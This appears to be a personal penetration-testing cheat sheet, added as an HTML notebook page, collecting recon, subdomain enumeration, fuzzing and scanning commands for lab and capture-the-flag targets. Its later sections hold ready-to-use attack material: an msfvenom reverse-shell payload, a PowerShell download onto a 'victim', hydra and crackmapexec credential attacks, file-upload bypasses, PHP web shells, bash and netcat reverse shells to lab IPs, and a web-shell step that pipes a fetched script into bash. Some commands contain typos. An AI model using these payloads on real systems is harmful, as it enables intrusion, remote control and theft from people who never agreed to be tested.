@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personal - My Notebook Website</title>
+    <link rel="stylesheet" href="../Static/styles.css">
+</head>
+<body>
+    <header>
+        <h1>Welcome to My Notebook</h1>
+        <nav>
+            <ul>
+                <li><a href="../Main.html">Home</a></li>
+            </ul>
+        </nav>
+    </header>
+<p>// my empro</p>
+<h1 id="recon-phase">Recon phase</h1>
+<ul>
+<li><p>Large scope</p>
+<ul>
+<li>Get <a href="https://osintframework.com/">OSINT</a> for IP ranges (amass, <a href="https://github.com/yassineaboukir/Asnlookup">asnlookup</a>, metabigor, bgp)</li>
+</ul>
+</li>
+</ul>
+<pre><code> - Review latest  [<span class="hljs-string">acquisitions</span>](<span class="hljs-link">https://www.crunchbase.com/</span>)
+
+
+ - Get relationships by registrants ([<span class="hljs-string">viewdns</span>](<span class="hljs-link">https://viewdns.info/reversewhois/</span>))
+
+
+ - Go to medium scope for each domain
+</code></pre><h1 id="on-small-domain">ON Small Domain</h1>
+<ul>
+<li>subfinder -d domainname.com |httpx | gau |uro | gf lfi | tee save-file.txt</li>
+</ul>
+<h1 id="dnsdump">DnsDump</h1>
+<ul>
+<li><a href="https://dnsdumpster.com">dnsdumpster</a></li>
+</ul>
+<h1 id="subdomain-enum">Subdomain Enum</h1>
+<ul>
+<li><p><code>amass</code> enum -d clicktheclapbutton50timesplz.com</p>
+</li>
+<li><p><code>sublist3r</code> -d techyrick.com -o file.txt</p>
+</li>
+<li><p><code>subfinder</code> -d domain.com -all -silent</p>
+</li>
+<li><p><code>assetfinder</code> assetfinder</p>
+</li>
+<li><p><code>gobuster vhost</code> -u <a href="http://thetoppers.htb">http://thetoppers.htb</a> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain  //subdomain</p>
+</li>
+<li><p>echo domain.com | <code>waybackurls</code> | unfurl -u domains</p>
+</li>
+<li><code>gau</code> --subs example.com | unfurl -u domains</li>
+<li><a href="https://crt.sh/">crt.sh</a></li>
+</ul>
+<h1 id="technologies">Technologies</h1>
+<ul>
+<li><p><strong>wappalyzer</strong></p>
+</li>
+<li><p>python-<a href="https://github.com/claymation/python-builtwith">builtwith</a></p>
+</li>
+<li><p><a href="https://github.com/projectdiscovery/httpx">httpx</a></p>
+</li>
+</ul>
+<h1 id="content-discovery">Content Discovery</h1>
+<ul>
+<li><p><code>crawley</code> -all -cookie &quot;security=low; PHPSESSID=mlhjkmo9l7slsf8g548pnd4pjn&quot; <a href="http://localhost/dvwa">http://localhost/dvwa</a>  &gt; io.txt</p>
+</li>
+<li><p><code>ffuf</code> -u <a href="http://URL/FUZZ">http://URL/FUZZ</a> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -mc 200,302</p>
+</li>
+<li><p><code>wfuzz</code> -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,302,301 <a href="http://10.129.206.31/FUZZ.php">http://10.129.206.31/FUZZ.php</a></p>
+</li>
+<li><p><code>gobuster dir</code> -u <a href="http://url/">http://url/</a> -w wordlists -x php,txt,js -k +{for ssl }</p>
+</li>
+<li><p><code>dirsearch</code></p>
+</li>
+</ul>
+<h1 id="parameters">Parameters</h1>
+<ul>
+<li><p><code>ffuf</code> -w /path/to/paramnames.txt -u <a href="https://target/script.php?FUZZ=test_value">https://target/script.php?FUZZ=test_value</a> -fs 4242</p>
+</li>
+<li><p><code>ParmMainar(Burp)</code> </p>
+</li>
+<li><p><code>x8</code> </p>
+</li>
+</ul>
+<h1 id="sub-domain_takeover">sub-domain_takeover</h1>
+<ul>
+<li><p><code>subzy</code> </p>
+<pre><code> ./subzy <span class="hljs-built_in">run</span> <span class="hljs-comment">--targets list.txt</span>
+</code></pre></li>
+<li><p><code>can-i-take-over-xyz</code>.<a href="https://github.com/EdOverflow/can-i-take-over-xyz">git</a>   </p>
+</li>
+</ul>
+<blockquote>
+<p>==========================================Automation<strong>And</strong>Collected-Command==========================================</p>
+</blockquote>
+<p><strong>Curl</strong></p>
+<ul>
+<li>curl -X OPTIONS -I <URL> [allow HTTP Methods]</li>
+</ul>
+<p><strong>fuff</strong></p>
+<ul>
+<li>ffuf -u <a href="http://URL/FUZZ">http://URL/FUZZ</a> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -mc 200,302</li>
+</ul>
+<ul>
+<li>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.23 -H "Host: FUZZ.permx.htb" -mc 200 -s</li>
+</ul>
+<p><strong>Wfuzz</strong></p>
+<ul>
+<li>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,302,301 <a href="http://10.129.206.31/FUZZ.php">http://10.129.206.31/FUZZ.php</a></li>
+</ul>
+<p><strong>gobuster [subdomain]</strong></p>
+<ul>
+<li>gobuster vhost -u <a href="http://thetoppers.htb">http://thetoppers.htb</a> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain  //subdomain</li>
+</ul>
+<p><strong>amass</strong></p>
+<ul>
+<li>amass enum -d clicktheclapbutton50timesplz.com</li>
+</ul>
+<p><strong>sublist3r</strong></p>
+<ul>
+<li>sublist3r -d techyrick.com -o file.txt</li>
+<li>sublist3r -d techyrick.com -b</li>
+</ul>
+<p><strong>nslookup</strong></p>
+<ul>
+<li>$ nslookup example.com</li>
+<li>$ nslookup $ip$ </li>
+<li>$ nslookup $ip$ $ip$</li>
+</ul>
+<p><strong>dig</strong> </p>
+<ul>
+<li>dig axfr cronos.htb @10.10.10.13</li>
+<li>dig -x 10.10.10.13 @10.10.10.13</li>
+</ul>
+<p><strong>zip2john</strong></p>
+<ul>
+    <li>zip2john your_file.zip > zip.hash</li>
+</ul>
+<p><strong>Whatweb</strong></p>
+<ul>
+<li>whatweb <a href="http://URL">http://URL</a> -v</li>
+</ul>
+<p><strong>nmap</strong></p>
+<ul>
+<li>nmap -sn 192.168.1.0/24 //scan networks</li>
+<li>nmap --top-ports 1000 $ip   </li>
+<li>nmap -iL list.txt</li>
+<li>nmap -A -T4 cloudflare.co</li>
+<li>nmap -sV localhost</li>
+<li>nmap -p- -pn -vv -T4 -n $ip</li>
+<li>nmap --top-ports 100 -A -sV -T4 $ip</li>
+<li>sudo nmap -sSVC -p-10000 $ip$</li>
+</ul>
+<p><strong>rustscan || like nmap</strong></p>
+<ul>
+<li>rustscan -a 10.129.184.36 --ulimit 5000 -- -A</li>
+</ul>
+<p><strong>tcpdump</strong></p>
+<ul><li>tcpduo -i tun0 port 1389</li></ul>
+<p><strong>bettercap</strong></p>
+<ul>
+<li>sudo bettercap</li>
+<li>net.probe on </li>
+<li>net.show</li>
+</ul>
+<p><strong>waybackurls</strong></p>
+<ul>
+<li>cat program.txt | waybackurls &gt;&gt; urls.txt  //For target scope</li>
+</ul>
+<p><strong>Impaket-server</strong></p>
+<ul><li> > sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .</li> 
+    <li> ? copy \\10.21.28.143\kali\reverse.exe C:\PrivEsc\reverse.exe </li>
+</ul>
+<p><strong>nuclei</strong></p>
+<ul>
+<li>cat program.txt | nuclei</li>
+</ul>
+<p><strong>password</strong></p>
+<ul><li>mkpasswd -m sha-512 Password1234</li></ul>
+<p><strong>John the Ripper</strong></p>
+<ul>
+<li>john --wordlists=/usr/share/wordlist/rockyou.txt john.txt</li>
+<li>john john.txt --show</li>
+</ul>
+<p><strong>Docker</strong></p>
+<ul>
+<li>sudo ddocker run --rm -i $Container/Name$</li>
+</ul>
+<p><strong>Metasploit</strong> </p>
+<ul>
+<li>search type:exploit name:smb platform:windows</li>
+</ul>
+<p><strong>searchsploit</strong></p>
+<p> searchsploit -m %path/file%</p>
+<p><strong>Upload File on Victem</strong></p>
+<p> powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#39;<a href="http://10.10.14.105:8000/MS10-059.exe">http://10.10.14.105:8000/MS10-059.exe</a>&#39;, &#39;MS10-059.exe&#39;)&quot;</p>
+<p><strong>PayLoad</strong></p>
+<p> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe &gt; writeup.exe</p>
+<p><strong>hydra</strong> </p>
+<p> hydra -l none -P rockyou.txt 10.10.10.43 https-post-form &quot;/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password&quot; -t 64 -V</p>
+<p><strong>crackmapexec</strong></p>
+<ul>
+<li>crackmapexec smb solarlab.htb -u blake -p pass.txt</li>
+</ul>
+<p><strong>wpscan</strong> </p>
+<ul>
+<li>wpscan --url example.com</li>
+</ul>
+<p><strong>HttpX</strong></p>
+<ul>
+<li><code>httpx</code> -ssc -td -title -fhr -location -pa</li>
+</ul>
+<p><strong>FOR iiS USE shortscan</strong></p>
+<ul>
+<li><code>shortscan</code> <a href="https://example.url.com/">https://example.url.com/</a> </li>
+</ul>
+<p><strong>Collect IP&#39;s</strong></p>
+<ul>
+<li><p>shodan.io</p>
+</li>
+<li><p>cencys,fofa,zommeye and all using</p>
+</li>
+</ul>
+<p><strong>File_Permitions</strong></p>
+<ul>
+<li><p>chmod a+rx filename</p>
+</li>
+<li><p>sudo shown www-data: /file/pass/</p>
+</li>
+</ul>
+<h3 id="file_uploadbypass">file_uploadbypass</h3>
+<p>========================<p>
+    Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;.htaccess&quot;
+    Content-Type: text/plain</p>
+    <p>AddType application/x-httpd-php .tez </p>
+    <p>========================</p>
+    <p>Content-Type: image/jpeg</p>
+    <p>========================</p>
+    <p>exiftool -Comment=&quot;&lt;?php echo &#39;START &#39; . file_get_contents(&#39;/home/carlos/secret&#39;) . &#39; END&#39;; ?&gt;&quot; ink.png -o polyglot.php</p>
+    <p>========================</p>
+    <p>test.php%00.jpg</p>
+    <p>========================</p>
+    <p>Lab: Web shell upload via race condition</p>
+    <p>========================</p> 
+<blockquote>
+<p>==========================================NOTE&amp;TIPS==========================================</p>
+</blockquote>
+<ul>
+<li><p>DOMAINS divide into ==&gt; info,api,dev,admin,stage..</p>
+</li>
+<li><p>etc on Windows ==&gt; <code>C:\Windows\System32\drivers\etc\passwd</code></p>
+</li>
+<li><p>ssh on windows ==&gt; <code>C:\Users\YourUsername\.ssh</code></p>
+</li>
+<li><p>Shell_UP ==&gt; <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></p>
+</li>
+<li><p>Shell_UP ==&gt; <code>script /dev/null -c bash</code></p>
+</li>
+<li><p>shell.sh ==&gt; <code>bash -c 'bash -i >& /dev/tcp/10.10.16.49/5555 0>&1'</code></p>
+</li>
+<li><p>shell==&gt; <code>?php system($_GET["cmd"]); ?></code></p>
+</li>
+<li><p>shell.php ==&gt; <code> ?php echo shell_exec($_GET['e'].' 2>&1'); ?></code></p>
+</li>
+<li><p>shell==&gt; <code>nc -e /bin/bash 10.10.10.10 5555</code></p>
+
+</li>
+<li><p>shell.sh==&gt; <code><p>#!/bin/bash</p>
+    <p>bash -i &gt;&amp; /dev/tcp/10.21.28.143/5555 0&gt;&amp;1</p>
+    </code></p>
+</li>
+<li><p>THEN==&gt; <code>http://site.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash</code></p>
+<br></br>
+
+</ul>
+<footer>
+    <p>&copy; 2024 My Notebook Website</p>
+</footer>
+</body>
+</html>
